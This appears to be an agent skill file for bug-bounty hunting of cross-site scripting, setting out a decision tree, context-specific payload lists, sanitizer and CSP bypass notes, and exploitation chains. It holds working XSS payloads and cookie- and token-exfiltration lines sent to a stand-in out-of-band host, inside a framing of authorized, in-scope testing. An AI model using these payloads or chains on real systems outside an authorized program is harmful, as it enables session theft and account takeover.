---
name: hunt-xss
description: Hunting skill for xss vulnerabilities. Generic playbook for reflected, stored, DOM, mutation-XSS, SVG/markdown, and CSP/Trusted-Types bypass on any stack. Use when hunting xss on any target.
sources: github, hackerone_public
report_count: 174
---

# HUNT-XSS — Cross-site scripting

JS execution in a real browser, on an origin that holds a session or token, is the primitive. Severity is whatever that JS can do next (session, CSRF-with-cookies, privileged action). `alert(1)` on a cookieless marketing page is the primitive only — do not file it as account takeover.

## Decision tree

1. **Sink exists?** Unique marker (8+ random alphanumerics, not a dictionary word) appears in HTML/JS. If the no-marker baseline already contains it, pick another marker.
2. **Encoded?** Marker is `&lt;`, `\u003c`, `%3C`, or inside a JSON string the DOM never parses as HTML → not XSS. Stop this param.
3. **Which context?** See the breakout table. A payload for the wrong context is a false negative, not a patched sink.
4. **Executes?** Current Chrome or Firefox runs it, or a blind beacon returns a **browser** User-Agent. Server-side fetch of your URL is SSRF, not XSS.
5. **Impact?** Read a real session artifact or perform one authorized state change as the victim context. Then chain. Prove once.

| Context (where the marker sits) | Break with | Shape |
|---|---|---|
| HTML body | raw `<` | `<img src=x onerror=alert(document.domain)>` |
| Double-quoted attr | `"` | `" onfocus=alert(document.domain) autofocus="` |
| Single-quoted attr | `'` | `' onfocus=alert(document.domain) autofocus='` |
| Unquoted attr | space | ` onfocus=alert(document.domain) autofocus` |
| JS string | quote + `;` | `';alert(document.domain)//` |
| JS template literal | `${}` | `${alert(document.domain)}` |
| `href` / `src` / redirect | scheme | `javascript:alert(document.domain)` |
| CSS / `<style>` | close the style | `</style><img src=x onerror=alert(document.domain)>` |
| SVG document (`image/svg+xml`) | script in SVG | `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>` |
| JSON reflected into `innerHTML` | DOM parse | mark as DOM XSS — see `hunt-dom` |

## Where it shows up (any stack)

- Query/body/header reflected into HTML: search, error, `redirect`, `next`, `return`, `callback`, `utm_*`, `lang`.
- Stored: name, bio, comment, ticket, address, filename, label/color, markdown, rich text, chat, email templates, PDF/HTML renderers.
- Blind: values an admin, mail gateway, or log UI renders later (User-Agent, Referer, username, error string, filename).
- File responses: SVG, HTML, XML served inline without `Content-Disposition: attachment` and without `nosniff`.
- DOM sinks in JS bundles: `innerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, `location`, `href` — full source/sink method is `hunt-dom`.
- Weak signals, not proof: missing CSP, `X-XSS-Protection: 0`, `text/html` without `nosniff`. No shipping browser still has an XSS auditor (Chrome removed it in v78).

## Payloads that travel

Probe (context discovery), not an exploit: `aaa"bbb'ccc<ddd>eee`fff`

```html
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<video src=x onerror=alert(document.domain)><audio src=x onerror=alert(document.domain)>
<button popovertarget=x>x</button><div popover id=x onbeforetoggle=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
```

```html
<!-- javascript: scheme (href/src/redirect). Tabs, newlines, and entities survive some filters -->
javascript:alert(document.domain)
java%0ascript:alert(document.domain)
javascript://%0aalert(document.domain)
&#106;avascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
```

```html
<!-- mXSS: sanitizer accepts it, the browser mutates it into a live tag. Retest per sanitizer version. -->
<svg><style><img src=x onerror=alert(document.domain)></style></svg>
<math><mtext><table><mglyph><style><!--</style><img title="--" src=x onerror=alert(document.domain)>
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
```

Markdown / wiki / rich text (only if the renderer emits real HTML and a browser executes it):

```markdown
[x](javascript:alert(document.domain))
<http://x><img src=x onerror=alert(document.domain)>
```

jQuery `< 3.5.0` passed through `.html()` / `.append()`: `<style><style/><img src=x onerror=alert(document.domain)>` (CVE-2020-11022 / CVE-2020-11023).

DOMPurify is not a guarantee. Version-gate, then prove execution — a version match alone is not a finding:

- CVE-2024-47875 — nesting mXSS, affected `<2.5.0` and `3.0.0–3.1.2` (fixed 2.5.0 / 3.1.3).
- CVE-2024-45801 — related prototype-pollution mXSS; check the same 2.x/3.x patch line.
- CVE-2025-15599 — rawtext breakout (`textarea` / `title` / `style` / `script` containers), affected 3.1.3–3.2.6 and 2.5.3–2.5.8 (3.x fixed in 3.2.7; 2.x unpatched).

WAF evasion is context-specific. Prefer a different event or tag over encoding soup. Null bytes almost never survive modern parsers — do not waste the attempt. Case tricks (`<ScRiPt>`), slash-in-tag (`<svg/onload=...>`), and `eval(atob(...))` only help when the filter is a keyword blocklist.

JSONP: if `callback` or `cb` is reflected into a script body unescaped, `?callback=alert(document.domain)//` is XSS. Confirm `Content-Type` is JavaScript or the response is loaded via `<script src>`.

## CSP and Trusted Types

Read the live `Content-Security-Policy` before claiming a bypass.

- No CSP, or `script-src` contains `'unsafe-inline'` without a nonce/hash → inline event handlers run.
- Nonce/`strict-dynamic`: look for a gadget on an allowlisted host (JSONP, old Angular, user-upload JS), a missing `base-uri` (`<base href>`), or the nonce reused from a reflected page into an injected script.
- `script-src 'self'` does **not** apply to a same-origin `image/svg+xml` navigation the way people assume — open the SVG URL directly and see whether script runs. `X-Content-Type-Options: nosniff` does not stop SVG script.
- Trusted Types (`require-trusted-types-for 'script'`): classic `innerHTML` throws. The bug is a policy that returns attacker HTML unchanged (`createPolicy('default'|name, s => s)`). Escape the policy, then show execution.

CSS-only injection without script is `hunt-dom` (exfil), not XSS, unless you break out of the style context.

## Blind / stored — OOB gate

Plant **one unique host per field** (`https://<sink>-<rand>.<oob>/x`) inside a payload that only fires in a browser (`<img src=x onerror=fetch('https://...')>` or `new Image()`). A hit counts only if the User-Agent is a browser.

- Encoded reflection, a validator rejecting `<`, or your string inside a URL-encoded attribute is not XSS. `%22` in an HTML attribute stays literal `%22`.
- No callback yet is "not confirmed". Admin/mail/log sinks often fire hours later — keep the listener open. Retract only when you have shown the stored value is encoded at render time, or the listener covered the real review window with zero browser hits.
- Server-side HTTP client User-Agent = the server fetched the URL (SSRF-shaped), not a victim browser.

## Validation

| Claim | Evidence required | Not evidence |
|---|---|---|
| Reflected/DOM XSS | Payload runs in a current browser on the target origin; screenshot or OOB from that page | Marker in Burp, encoded `<`, console on a different origin |
| Stored XSS | Second session (or the victim role) renders and executes it | You viewed your own unsanitized preview only (self-XSS) |
| Blind XSS | OOB request with a browser UA and your per-sink host | DNS-only hit from a server fetcher, or silence after a short poll |
| CSP bypass | JS runs **despite** the policy you quoted | A bypass payload you did not execute |
| Cache → stored | Clean client, cache-buster removed, still receives the marker (`hunt-cache-poison`) | One poisoned request that only you sent |

Self-XSS becomes a finding only through a proven chain (CSRF that writes the payload, or a login/OAuth flow where the victim's own browser hits it). State the chain.

Impact sentence must name the artifact: session cookie readable (or not, if `HttpOnly` — then show a same-origin action), token in `localStorage` / JS-readable header, or one state-changing request forged from the page. Do not claim "mass credential harvest" or "admin takeover" without that step.

## Chains

| Once JS runs on the origin | Next step | Result |
|---|---|---|
| `HttpOnly` absent, or token in JS storage | `fetch('https://oob/?c='+document.cookie)` one shot | Session theft |
| Cookie is `HttpOnly` | `fetch('/api/account', {credentials:'include'})` and exfil the JSON | ATO without reading the cookie |
| Self-XSS + CSRF on the same field | CSRF sets the field; victim's next view runs it (`hunt-csrf`) | Stored XSS |
| XSS on OAuth/callback page | Read `location.hash` / `location.search` for `access_token` or `code` | Token theft (`hunt-oauth`) |
| Reflected XSS + cacheable unkeyed input | Poison once; clean client receives it | Stored-equivalent |
| SVG upload served same-origin | Script in the SVG file | XSS outside the HTML sanitizer |
| `postMessage` handler feeds a sink | Frame the page and send the payload | XSS without a URL param (`hunt-dom`) |
| Stored XSS a privileged role will open | One payload in a ticket/wiki/profile | Action as that role |

Do not label a finding Critical unless the chain's last step was actually performed once. Otherwise report the proven primitive at the severity the session allows (often Medium for a non-sensitive origin).

## Rails

- In-scope only. Read-only by default; one stored payload only if the program allows writes. No mass posts, no worm, no DoS.
- No brute-force of tokens, sessions, or CSP nonces.
- Draft only — do not submit. Dedup before drafting.

## Before you report — dedup gate

Fresh/changed surface first (`dedup-novelty`, `changed-js-deepdive`). Before drafting:

```bash
python3 engine/dedup.py check --program <program> --class xss --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless the endpoint, param, or a bypass of the deployed fix is a concrete differentiator.

Cross-refs: `hunt-dom`, `hunt-csrf`, `hunt-cache-poison`, `hunt-file-upload`, `hunt-oauth`, `triage-validation`.
